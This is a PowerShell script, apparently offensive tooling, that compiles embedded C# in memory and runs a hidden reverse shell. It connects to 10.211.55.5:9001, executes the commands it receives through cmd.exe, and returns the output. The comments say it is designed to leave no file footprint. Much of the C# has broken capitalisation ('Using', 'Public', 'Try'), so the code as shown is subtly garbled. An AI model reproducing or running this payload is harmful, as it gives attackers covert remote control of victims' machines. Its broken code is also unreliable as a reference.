# Advanced Memory-Only Reverse Shell (Staged)
# This payload uses [System.Reflection.Assembly] to execute in-memory
# without leaving a file footprint or standard process pipes.

$h = "10.211.55.5"
$p = 9001

$sc = @"
// Using directives must be at the very top of the C# source file
Using System;
Using System.Net.Sockets;
Using System.Runtime.InteropServices; // Needed for DllImport, though not used in this specific version
Using System.Text;
Using System.Diagnostics; // Needed for Process class

// A class definition must encapsulate methods and fields
Public class B
{
    // DllImport is not directly used in this version, but kept for future expansion
    // [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    // [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string l);
Public static void R()
    {
        TcpClient c = null; // Initialize to null
        NetworkStream s = null; // Initialize to null
Try
        {
C = new TcpClient("$h", $p);
S = c.GetStream();
Byte[] b = new byte[4096]; // Increased buffer size for better command handling
            StringBuilder outputBuilder = new StringBuilder();
While (c.Connected)
            {
                // Read command from the attacker
Int i = s.Read(b, 0, b.Length);
If (i == 0) // Connection closed
                {
Break;
                }
String cmd = Encoding.ASCII.GetString(b, 0, i).Trim(); // Trim whitespace
If (string.IsNullOrEmpty(cmd))
                {
Continue; // Skip empty commands
                }
If (cmd.ToLower() == "exit")
                {
Break; // Terminate shell
                }

                // Execute command using Process
                Process p = new Process();
P.StartInfo.FileName = "cmd.exe";
P.StartInfo.Arguments = "/c " + cmd;
P.StartInfo.RedirectStandardOutput = true;
P.StartInfo.RedirectStandardError = true; // Capture errors too
P.StartInfo.UseShellExecute = false;
P.StartInfo.CreateNoWindow = true; // Hide the command window
P.Start();

                // Read all output and errors
String stdout = p.StandardOutput.ReadToEnd();
String stderr = p.StandardError.ReadToEnd();
P.WaitForExit(); // Ensure process finishes
OutputBuilder.Clear();
OutputBuilder.AppendLine(stdout);
If (!string.IsNullOrEmpty(stderr))
                {
OutputBuilder.AppendLine("ERROR: " + stderr);
                }
OutputBuilder.Append("PS>"); // Prompt for next command
Byte[] o = Encoding.ASCII.GetBytes(outputBuilder.ToString());
S.Write(o, 0, o.Length);
            }
        }
Catch (Exception ex)
        {
            // Basic error handling for debugging
            // In a real payload, you'd want to be silent or log elsewhere
Byte[] errorBytes = Encoding.ASCII.GetBytes("Error: " + ex.Message + Environment.NewLine);
If (s != null && s.CanWrite)
            {
S.Write(errorBytes, 0, errorBytes.Length);
            }
        }
Finally
        {
If (s != null) s.Close();
If (c != null) c.Close();
        }
    }
}
"@

# Compile to memory with dynamic assembly referencing
# Ensure all necessary assemblies are referenced.
# System.Net.Sockets is implicitly part of System, but explicitly adding it doesn't hurt.
# System.Diagnostics is also implicitly part of System.
Add-Type -TypeDefinition $sc -PassThru -ReferencedAssemblies "System", "System.Net.Sockets", "System.Diagnostics"

# Execute the reverse shell
[B]::R()
